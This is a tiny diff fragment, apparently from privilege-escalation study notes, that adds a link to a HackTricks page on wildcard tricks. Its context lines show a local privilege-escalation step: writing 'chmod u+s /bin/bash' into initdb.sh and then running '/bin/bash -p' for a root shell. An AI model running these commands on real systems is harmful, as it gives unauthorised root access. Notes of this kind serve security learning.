@@ -4,4 +4,8 @@ echo "chmod u+s /bin/bash" > initdb.sh
 /bin/bash -p
 ------------------
 
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
+
+
+
 
